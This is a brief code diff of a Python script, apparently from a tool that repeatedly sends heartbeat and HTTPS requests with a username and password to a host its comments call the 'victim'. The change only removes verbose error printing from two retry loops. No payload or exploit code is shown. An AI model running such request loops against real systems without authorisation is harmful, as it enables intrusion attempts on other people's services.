@@ -27,8 +27,6 @@ def heartbeat():
             time.sleep(heartbeat_freq)
         # handling victim shutdown before own shutdown
         except Exception as e:
-            if args.verbose:
-                print(e)
             time.sleep(heartbeat_freq)
 
 
@@ -42,8 +40,6 @@ def https_requests(post_user, post_password):
             do_request(post_user, post_password)
         # handling victim shutdown before own shutdown
         except Exception as e:
-            if args.verbose:
-                print(e)
             time.sleep(5)
 
 
